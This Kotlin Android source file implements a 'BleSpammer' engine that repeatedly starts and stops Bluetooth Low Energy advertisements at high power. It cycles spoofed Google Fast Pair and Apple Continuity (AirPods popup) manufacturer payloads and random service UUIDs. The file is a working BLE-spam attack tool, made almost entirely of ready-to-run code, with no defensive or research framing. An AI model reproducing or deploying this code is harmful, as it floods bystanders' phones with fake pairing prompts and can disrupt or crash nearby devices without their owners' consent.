package com.drybrine.xcutandroid

import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.Context
import android.os.ParcelUuid
import android.util.Log
import java.util.UUID
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

enum class SpamType(val label: String) {
    FASTPAIR("Fast Pair"),
    CONTINUITY("Apple Continuity"),
    GENERIC("Generic churn"),
}

/**
 * BLE advertisement churn engine - written from scratch (concept-level port
 * of the public BLE-spam technique): rapid stop/start of legacy
 * advertisements with rotating payloads. No root, no Shizuku - plain
 * BluetoothLeAdvertiser API.
 */
class BleSpammer(private val context: Context) {

    private val adapter by lazy {
        val bm = context.getSystemService(Context.BLUETOOTH_SERVICE) as android.bluetooth.BluetoothManager
        bm.adapter
    }

    private var advertiser: BluetoothLeAdvertiser? = null
    private var thread: Thread? = null
    @Volatile private var running = false

    private val tag = "BleSpammer"

    fun start(type: SpamType) {
        val adv = adapter?.bluetoothLeAdvertiser
        if (adv == null) {
            Log.e(tag, "BLE advertising not supported on this device")
            return
        }
        if (running) stop()
        advertiser = adv
        running = true
        thread = Thread({ loop(type) }, "ble-spam").apply {
            isDaemon = true
            start()
        }
    }

    fun stop() {
        running = false
        advertiser?.stopAdvertising(null)
    }

    private fun loop(type: SpamType) {
        val advert = advertiser ?: return
        var iteration = 0
        while (running) {
            iteration++
            val (data, scanResp) = buildPayload(type, iteration)
            val settings = AdvertiseSettings.Builder()
                .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                .setConnectable(false)
                .build()
            val latch = CountDownLatch(1)
            val cb = object : AdvertiseCallback() {
                override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                    Log.d(tag, "adv started ($type, #$iteration)")
                    latch.countDown()
                }

                override fun onStartFailure(errorCode: Int) {
                    Log.e(tag, "adv FAILED code=$errorCode ($type)")
                    latch.countDown()
                }
            }
            try {
                advert.startAdvertising(settings, data, scanResp, cb)
                if (!latch.await(800, TimeUnit.MILLISECONDS)) {
                    Log.e(tag, "adv start timeout")
                }
            } catch (e: Exception) {
                Log.e(tag, "startAdvertising error: $e")
            } finally {
                try {
                    advert.stopAdvertising(cb)
                } catch (_: Exception) {
                }
            }
            Thread.sleep(if (type == SpamType.GENERIC) 5L else 30L)
        }
        Log.d(tag, "loop berhenti")
    }

    private fun buildPayload(type: SpamType, iteration: Int): Pair<AdvertiseData, AdvertiseData> {
        return when (type) {
            SpamType.FASTPAIR -> fastPairPayload(iteration)
            SpamType.CONTINUITY -> continuityPayload(iteration)
            SpamType.GENERIC -> genericPayload(iteration)
        }
    }

    /** Google Fast Pair: company 0x000E, 0x06 0x00 version, 3-byte model id, random salt. */
    private fun fastPairPayload(iteration: Int): Pair<AdvertiseData, AdvertiseData> {
        val models = intArrayOf(
            0x72EF8D, 0x0E30C3, 0x00000D, 0x000007, 0x0B0000, 0x060000,
            0xF00000, 0x003B41, 0x0100F0, 0x003000, 0x001000,
        )
        val modelId = models[iteration % models.size]
        val payload = byteArrayOf(
            0x06, 0x00,
            (modelId shr 16).toByte(), (modelId shr 8).toByte(), modelId.toByte(),
            randByte(), randByte(), randByte(), randByte(), randByte(),
            randByte(), randByte(), randByte(), randByte(), randByte(),
            randByte(),
        )
        val data = AdvertiseData.Builder()
            .addManufacturerData(0x000E, payload)
            .build()
        return data to AdvertiseData.Builder().build()
    }

    /** Apple Continuity (AirPods popup): company 0x004C, type 0x10, status+battery, random nonce. */
    private fun continuityPayload(iteration: Int): Pair<AdvertiseData, AdvertiseData> {
        val payload = byteArrayOf(
            0x10, 0x05,
            0x0f, 0x01, 0x10, 0x06, 0x0f, 0x0f,
            randByte(), randByte(), randByte(), randByte(),
            randByte(), randByte(), randByte(), randByte(),
        )
        val data = AdvertiseData.Builder()
            .addManufacturerData(0x004C, payload)
            .build()
        return data to AdvertiseData.Builder().build()
    }

    /** Generic: random 16-bit service UUID every iteration - max adv churn. */
    private fun genericPayload(iteration: Int): Pair<AdvertiseData, AdvertiseData> {
        val uuid = UUID.randomUUID()
        val msb = uuid.mostSignificantBits
        val uuid16 = (msb ushr 32) and 0xFFFFL
        val data = AdvertiseData.Builder()
            .addServiceUuid(ParcelUuid.fromString(String.format("0000%04X-0000-1000-8000-00805F9B34FB", uuid16)))
            .build()
        return data to AdvertiseData.Builder().build()
    }

    private fun randByte(): Byte = (Math.random() * 256).toInt().toByte()
}